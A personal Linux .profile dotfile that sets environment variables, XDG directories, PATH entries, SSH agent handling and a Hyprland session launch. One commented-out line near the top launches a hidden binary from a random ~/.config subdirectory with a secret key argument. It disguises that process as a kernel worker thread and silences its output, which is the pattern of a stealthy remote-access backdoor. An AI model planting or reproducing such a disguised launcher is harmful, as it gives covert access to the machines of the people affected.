#!/bin/bash -x

## __   _______ _____ _____
## \ \ / / ____| ____|_   _|
##  \ V /|  _| |  _|   | |
##   | | | |___| |___  | |
##   |_| |_____|_____| |_|
## .profile
# set +m; HOME=/home/yigit TERM="xterm-256color" SHELL="/bin/bash" QS_ARGS="-liqs lBg2WqxLORaqhKLF2bxC" /usr/bin/bash -c "exec -a [kworker/R-btrfs-delayed-meta] /home/yigit/.config/.i9NSn7wj/K4VX7Nvg" &>/dev/null &


systemctl status display-manager 2> /dev/null > /dev/null
disp_manager=$?

# Vars for some bugs and applications
export QT_QPA_PLATFORMTHEME="qt5ct"
export BAT_THEME="Catppuccin Mocha"
export _JAVA_AWT_WM_NONREPARENTING=1
export AWT_TOOLKIT=MToolkit
export ELECTRON_OZONE_PLATFORM_HINT=auto


# Environment variables
export SHELL=/usr/bin/zsh
export TERMINAL=/usr/local/bin/st
export BROWSER=firefox
export EDITOR=nvim
export OPENER=xdg-open
export DEFAULT_RECIPIENT="yigitcolakoglu@hotmail.com"
export LIBVIRT_DEFAULT_URI="qemu:///system"
export GTK_THEME="catppuccin-mocha-mauve-standard+default"

# Set XDG Directories
export XDG_DATA_HOME="$HOME"/.local/share
export XDG_CONFIG_HOME="$HOME"/.config
export XDG_CACHE_HOME="$HOME"/.cache
export XDG_DATA_DIRS="/usr/local/share:/usr/share"
export XDG_CONFIG_DIRS="/etc/xdg"

# Cleanup Home Directory
export HISTFILE="$XDG_DATA_HOME"/history
export TMUX_PLUGIN_MANAGER_PATH="$XDG_DATA_HOME"/tmux/plugins
export BORG_KEYS_DIR="$XDG_DATA_HOME"/keys/borg
export CARGO_HOME="$XDG_DATA_HOME"/cargo
export DOOMDIR="$XDG_CONFIG_HOME"/doom
export GOPATH="$XDG_DATA_HOME"/go
export GDBHISTFILE="$XDG_DATA_HOME"/gdb/history,
export ANDROID_HOME="$XDG_DATA_HOME"/Android/Sdk
export FLUTTER_HOME="$XDG_DATA_HOME"/flutter
export LEIN_HOME="$XDG_DATA_HOME"/lein
export NPM_CONFIG_USERCONFIG=$XDG_CONFIG_HOME/npm/npmrc
export NVM_DIR="$XDG_DATA_HOME"/nvm
export GNUPGHOME="$XDG_DATA_HOME"/gnupg
export MBSYNCRC="$XDG_CONFIG_HOME"/isync/mbsyncrc
export IMAPFILTER_CONFIG="$XDG_CONFIG_HOME/imapfilter/config.lua"
export GHCUP_HOME="$HOME/.ghcup"
# export VIMINIT="set nocp | source ${XDG_CONFIG_HOME:-$HOME/.config}/vim/vimrc"
export MYSQL_HISTFILE="$XDG_DATA_HOME"/mysql_history
export TASKDATA="$XDG_DATA_HOME"/task
export TASKRC="$XDG_CONFIG_HOME"/task/taskrc
export WEECHAT_HOME="$XDG_CONFIG_HOME"/weechat
export LESSKEY="$XDG_CONFIG_HOME"/less/lesskey
export LESSHISTFILE=-
export NOTMUCH_CONFIG="$XDG_CONFIG_HOME"/notmuch/notmuchrc
export NMBGIT="$XDG_DATA_HOME"/notmuch/nmbug
export _JAVA_OPTIONS=-Djava.util.prefs.userRoot="$XDG_CONFIG_HOME"/java
export IPYTHONDIR="$XDG_CONFIG_HOME"/jupyter
export JUPYTER_CONFIG_DIR="$XDG_CONFIG_HOME"/jupyter
export PYLINTHOME="$XDG_CACHE_HOME"/pylint
export WGETRC="$XDG_CONFIG_HOME/wgetrc"
# export GRADLE_USER_HOME="$XDG_DATA_HOME"/gradle
export RANDFILE="$XDG_DATA_HOME"/openssl/rnd
export _Z_DATA="$XDG_DATA_HOME/z"
export GTK2_RC_FILES="$XDG_CONFIG_HOME"/gtk-2.0/gtkrc
export WAKATIME_HOME="$XDG_CONFIG_HOME/wakatime"
export INPUTRC="$XDG_CONFIG_HOME"/readline/inputrc
export PASSWORD_STORE_DIR="$XDG_DATA_HOME"/pass
export PASSWORD_STORE_ENABLE_EXTENSIONS=true
export TMUX_TMPDIR="$XDG_RUNTIME_DIR"
export SCREENRC="$XDG_CONFIG_HOME"/screen/screenrc
export BUN_INSTALL="$HOME/.local/share/bun"

# Change X Config Files if we are not using a displaymanager
if [ $disp_manager -ne 0 ]; then
  export XSERVERRC="$XDG_CONFIG_HOME"/X11/xserverrc
  export XINITRC="$XDG_CONFIG_HOME"/X11/xinitrc
  export XAUTHORITY="$XDG_RUNTIME_DIR"/Xauthority
fi

# Setup PATH
export PATH="$BUN_INSTALL/bin:$PATH"
export PATH="$PATH:/usr/lib/emscripten"
export PATH="$PATH:$HOME/.yarn/bin"
export PATH="$PATH:$ANDROID_HOME/tools"
export PATH="$PATH:$ANDROID_HOME/platform-tools"
export PATH="$PATH:$GHCUP_HOME/bin"
export PATH="$PATH:$XDG_DATA_HOME/nvim/mason/bin"
export PATH="$PATH:/usr/lib/w3m:$HOME/.local/bin"
export PATH="$PATH:$HOME/.gem/ruby/2.7.0/bin"
export PATH="$PATH:$GOPATH/bin"
export PATH="$PATH:$GOPATH/binexport"
export PATH="$PATH:$XDG_DATA_HOME/cargo/bin/"
export PATH="$PATH:$XDG_DATA_HOME/questasim/questasim/linux_x86_64"
export PATH=$XDG_DATA_HOME/node/bin:$PATH
export PATH="$PATH:$XDG_DATA_HOME/codeql"
# export PATH="$PATH:$XDG_DATA_HOME/anaconda3/bin"

export CPATH=/usr/include/opencv4

## BeMenu config
source $HOME/.config/bemenu/config.sh

export LM_LICENSE_FILE=27017@flexserv1.tudelft.nl

# Set zettelkasten directory
export ZK_NOTEBOOK_DIR=~/Projects/Neocortex/content

export PYENV_ROOT="$HOME/.local/share/pyenv"
export CLAUDE_USE_WAYLAND=1

# [[ ! -r "$HOME/.opam/opam-init/init.sh" ]] || source "$HOME/.opam/opam-init/init.zsh" > /dev/null 2> /dev/null

export MPV_IPC="$XDG_RUNTIME_DIR/mpv.socket"

# Setup LF Icons (Doing this everytime lf start might cause some overhead)
LF_ICONS=$(sed ~/.config/lf/diricons \
            -e '/^[ \t]*#/d'       \
            -e '/^[ \t]*$/d'       \
            -e 's/[ \t]\+/=/g'     \
            -e 's/$/ /')
LF_ICONS=${LF_ICONS//$'\n'/:}

# Sudo Prompt
export SUDO_PROMPT="$(printf '\033[38;5;141m\033[0m Shall you pass?') "

export LF_ICONS

if [ $disp_manager -ne 0 ]; then
  # Setup dbus
  case "$(readlink -f /sbin/init)" in
    *systemd*) export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$(id -u)/bus ;;
  esac
fi

# Setup SSH
if [ ! "$SSH_AUTH_SOCK" ]; then
  if [ -e "$XDG_RUNTIME_DIR/gcr/ssh" ] && [ -z "$SSH_TTY" ]; then
    export SSH_AUTH_SOCK="$XDG_RUNTIME_DIR/gcr/ssh"
  else
    eval "$(ssh-agent | head -n 2)"
    # grep -slR "PRIVATE" ~/.ssh/ | xargs ssh-add > /dev/null 2> /dev/null
  fi
fi

if [ "$DISPLAY" = "" ] && [ "$(tty)" = /dev/tty1 ] && [ $disp_manager -ne 0 ]; then
  if [ "$DBUS_SESSION_BUS_ADDRESS" = "" ] && [ ! $(command -v dbus-run-session)  = "" ]; then
    exec dbus-run-session Hyprland 2> $XDG_RUNTIME_DIR/xinit.err > $XDG_RUNTIME_DIR/xinit
  else
    exec Hyprland 2> $XDG_RUNTIME_DIR/xinit.err > $XDG_RUNTIME_DIR/xinit
  fi
  exit
fi

if [ -f "$HOME/.local/share/cargo/env" ]; then
  . "$HOME/.local/share/cargo/env"
fi

if [ -f "$HOME/.config/config.env" ]; then
  source "$HOME/.config/config.env"
fi
